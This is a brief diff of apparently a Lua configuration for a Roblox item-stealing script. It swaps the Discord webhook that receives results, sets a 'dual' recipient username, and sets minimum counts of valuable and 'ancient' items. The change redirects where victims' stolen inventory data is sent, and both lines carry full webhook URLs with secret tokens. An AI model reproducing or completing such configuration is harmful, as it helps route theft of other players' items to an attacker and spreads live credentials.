@@ -6,7 +6,7 @@ RawLink = "" -- [Raw Link If "Custom"]
 
 -- [ Dual Settings ] --
 DualUsername = "1LazySly8" -- [Dual Username]
-DualWebhook = "https://discord.com/api/webhooks/1296940147845365910/5klvjPBRgi-hRUmUwp3j5_sXcFLTUdhX6pO8Kmc1Du7zBXqJRPLcwl04DYBJSu9maKMv" -- [Dual Webhook]
+DualWebhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIPZv173EMATsBRMccyT6Dt20_JOM2EptEHto0S0opxeEykAaBjxOH-" -- [Dual Webhook]
 DualItems = 10 -- [Minimum Valuable Items Count]
 DualAncient = 5 -- [Minimum Ancient Count]
 
